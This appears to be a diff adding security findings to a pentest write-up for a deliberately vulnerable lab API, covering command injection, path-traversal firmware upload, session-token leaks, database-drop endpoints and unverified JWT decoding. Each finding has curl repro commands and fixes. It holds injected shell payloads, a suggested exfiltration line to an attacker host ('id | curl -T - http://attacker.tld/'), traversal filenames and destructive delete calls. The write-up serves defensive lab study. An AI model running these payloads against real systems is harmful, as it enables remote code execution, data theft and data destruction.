@@ -33,6 +33,12 @@ findings:
   - "API8: IN PROGRESS"
   - "API9: DONE"
   - "API10: DONE"
+  - "trigger_update RCE (API8, CWE-78): IN PROGRESS"
+  - "firmware/upload (API8, CWE-434/22): IN PROGRESS"
+  - "api/v1/debug/sessions (API9/API2): IN PROGRESS"
+  - "sessions dump (API9, CWE-200): IN PROGRESS"
+  - "camerasdb delete/restart (API8/API5): IN PROGRESS"
+  - "api/debug/decode_token (API9, CWE-489): IN PROGRESS"
 ---
 
 # API1:2023 - Broken Object Level Authorization
@@ -733,3 +739,177 @@ When the victim opens the message the handler fires and exfiltrates the victim's
 **Recommendation.** Bind the message sender to the authenticated JWT (the API10 fix) and, when rendering, either use `textContent` or sanitize the body against an allowlist of formatting tags, stripping event handlers and scriptable elements.
 
 > **INTRODUCE EXAMPLE WITH PASSWORD CHANGE CSRF**
+
+---
+
+# Exposed Debug and Administrative Endpoints (additional findings)
+
+Beyond the OWASP-category findings above, the API exposes several debug and administrative endpoints with no authentication or with a trivially weak check. They were undocumented but are among the highest-impact issues in the lab, including an unauthenticated remote code execution on the API host. Each finding below is tagged with its OWASP API 2023 category and CWE. They are documented from source review and the badges are `IN PROGRESS`, they have not been reproduced against the live lab because the destructive and RCE findings must not be run against a working deployment.
+
+## Unauthenticated OS command injection in /firmware/trigger_update (API8:2023, CWE-78)
+
+> **IN PROGRESS**
+
+`POST /firmware/trigger_update` takes `device_ip` and `firmware_url` from the request and builds a shell command that it runs with `shell=True`, with no authentication and no input sanitization:
+
+```python
+# app.py
+cmd = f"ssh root@{device_ip} '/etc/init.d/update-firmware {firmware_url}'"
+subprocess.Popen(cmd, shell=True)
+```
+
+Both parameters are attacker-controlled and are interpolated straight into the shell string, so either one injects arbitrary commands that run on the API host as the API process user. The SSH call does not even need to succeed, the injected command runs while the shell parses the line.
+
+Repro (runs a harmless probe on the API host):
+
+```bash
+curl -X POST http://localhost:5000/firmware/trigger_update \
+  --data-urlencode 'device_ip=127.0.0.1; touch /tmp/pwned ;#' \
+  --data-urlencode 'firmware_url=x'
+```
+
+Expected result: HTTP 200 `{"status": "update triggered", ...}` returns immediately because `Popen` does not wait, and `/tmp/pwned` then exists inside the API container. Swap the payload for a reverse shell or `id | curl -T - http://attacker.tld/` to prove full command execution and exfiltration.
+
+Impact: unauthenticated remote code execution on the API server. Even without injection, the endpoint lets an attacker point any `device_ip` at any `firmware_url`, which is the network half of the firmware-poisoning chain against the camera (see IoT4).
+
+Recommendation: authenticate and authorize the endpoint, drop `shell=True`, pass arguments as a list, and validate `device_ip` against an allowlist and `firmware_url` against an expected origin.
+
+## Unauthenticated firmware upload with path traversal in /firmware/upload (API8:2023, CWE-434, CWE-22)
+
+> **IN PROGRESS**
+
+`POST /firmware/upload` accepts any multipart file with no authentication and writes it under the client-supplied filename, unsanitized:
+
+```python
+# app.py, UPLOAD_FOLDER = '/vulnzoo/firmware'
+filepath = os.path.join(UPLOAD_FOLDER, file.filename)
+file.save(filepath)
+```
+
+Because `file.filename` is never sanitized, a filename such as `../../etc/cron.d/x` traverses out of the upload folder, so this is arbitrary file write and not only arbitrary upload. The uploaded blob is also served as the newest firmware by `GET /firmware/latest`, so an attacker can stage a malicious firmware that the device later fetches and runs, chained with the device `update-firmware` and with `trigger_update` above. See IoT4 for the device-side execution.
+
+Repro:
+
+```bash
+# arbitrary upload, becomes /firmware/latest
+curl -X POST http://localhost:5000/firmware/upload -F 'file=@evil.bin'
+curl http://localhost:5000/firmware/latest -o pulled.bin   # same bytes back
+
+# path traversal write outside the upload folder
+curl -X POST http://localhost:5000/firmware/upload \
+  -F 'file=@evil.bin;filename=../../tmp/escaped.bin'
+```
+
+Expected result: HTTP 200 `{"status": "uploaded", "filename": ...}`, the file present in `/vulnzoo/firmware` (or at the traversed path), and `GET /firmware/latest` returning the attacker's bytes.
+
+Impact: arbitrary file write on the API host and poisoning of the firmware update channel.
+
+Recommendation: authenticate the endpoint, sanitize the name with `secure_filename`, pin the destination directory, and verify a real firmware signature.
+
+## Session-token disclosure via /api/v1/debug/sessions (API9:2023, API2:2023, CWE-639, CWE-284)
+
+> **IN PROGRESS**
+
+`GET /api/v1/debug/sessions` requires an `admin_id` parameter and checks only that it belongs to an existing admin user, never that the caller is that admin. It then returns every session document including its `_id`, which is the session token used by the session-accepting paths:
+
+```python
+# app.py
+admin_user = mongo_client.vulnzoo_vuln.users.find_one({'_id': ObjectId(admin_id)})
+if not admin_user or admin_user.get('role') != 'admin': ...  # existence check only
+sessions = list(mongo_client.vulnzoo_vuln.sessions.find({}))
+for session in sessions:
+    session['_id'] = str(session['_id'])   # token exposed
+```
+
+The required `admin_id` is not secret, it leaks from the documented `GET /api/system/logs` (API8 Attack Vector #2), from `GET /api/messages` (the sender_id), and from `GET /api/v1/userinfo`.
+
+Repro:
+
+```bash
+# 1. obtain the admin id (for example from the logs endpoint)
+curl 'http://localhost:5000/api/system/logs' | grep -oE 'user_id=[a-f0-9]+'
+# 2. dump every session including the _id token
+curl 'http://localhost:5000/api/v1/debug/sessions?admin_id=<ADMIN_ID>'
+```
+
+Expected result: HTTP 200 with a `sessions[]` array where each entry carries `_id` (the session token) plus user_id, role, ip and user_agent. The admin session `_id` can then be replayed on the session-accepting paths.
+
+Impact: session hijacking, including the administrator's session, from an unauthenticated position given a public admin id.
+
+Recommendation: remove the debug endpoint from production, or bind it to a verified admin session and never return session identifiers.
+
+## Unauthenticated session enumeration via /sessions (API9:2023, API8:2023, CWE-200)
+
+> **IN PROGRESS**
+
+`GET /sessions` returns every session document with no authentication. It projects out `_id`, so it does not leak the session token, but it does expose the metadata of every active session:
+
+```python
+# app.py
+sessions = list(mongo_client.vulnzoo_vuln.sessions.find({}, {"_id": 0}))
+return jsonify({"sessions": sessions})
+```
+
+Repro:
+
+```bash
+curl http://localhost:5000/sessions
+```
+
+Expected result: HTTP 200 with a `sessions[]` array where each entry has `user_id`, `username`, `role`, `ip`, `user_agent` and `timestamp`. This maps users to roles and source IPs and confirms which accounts, including admins, are currently logged in, which is useful reconnaissance for the higher-severity findings.
+
+Impact: unauthenticated disclosure of who is logged in, their roles and their IPs. Unlike `/api/v1/debug/sessions`, it does not expose the token itself.
+
+Recommendation: authenticate the endpoint and scope it to the caller's own session.
+
+## Unauthenticated database destruction via /camerasdb/delete and /camerasdb/restart (API8:2023, API5:2023, CWE-306, CWE-352)
+
+> **IN PROGRESS**
+
+`GET /camerasdb/delete` drops the whole application database with no authentication, and `GET /camerasdb/restart` wipes and reinitializes it:
+
+```python
+# app.py
+@app.route('/camerasdb/delete', methods=['GET'])
+def delete_cameras_db():
+    mongo_client.drop_database('vulnzoo_vuln')
+```
+
+Because these are state-changing actions exposed over GET with no auth and no CSRF token, they can be triggered by a simple visit, an image tag, or a link prefetch.
+
+Repro (destructive, do not run against a working lab):
+
+```bash
+curl http://localhost:5000/camerasdb/delete     # drops users, cameras, sessions
+curl http://localhost:5000/camerasdb/restart    # wipe and reseed
+```
+
+Expected result: HTTP 200 `{"message": "... deleted successfully"}` and the database emptied, all users, cameras and sessions gone until `GET /camerasdb/init` runs again.
+
+Impact: full data destruction and denial of service from an unauthenticated position, and a CSRF sink because it is a GET.
+
+Recommendation: require an authenticated admin, use POST with a CSRF token, and gate destructive maintenance behind a non-public interface.
+
+## JWT decode without signature verification via /api/debug/decode_token (API9:2023, CWE-489, CWE-200)
+
+> **IN PROGRESS**
+
+`POST /api/debug/decode_token` decodes any supplied JWT with the signature check disabled and returns the payload, unauthenticated:
+
+```python
+# app.py -> JWTService.decode_without_verification(token)
+payload = jwt.decode(token, options={'verify_signature': False})
+```
+
+Repro:
+
+```bash
+curl -X POST http://localhost:5000/api/debug/decode_token \
+  -H 'X-Auth-Token: <ANY_JWT>'
+```
+
+Expected result: HTTP 200 `{"decoded": true, "payload": {...}, "note": "Token decoded without signature verification (debug mode)"}`.
+
+Impact: a debug oracle that reveals the internal structure and claims of any captured token, for example the `user_id` an attacker then forges with the weak secret (see API2). Low direct impact, but it is production debug surface that should not exist.
+
+Recommendation: remove the debug endpoint from production builds.
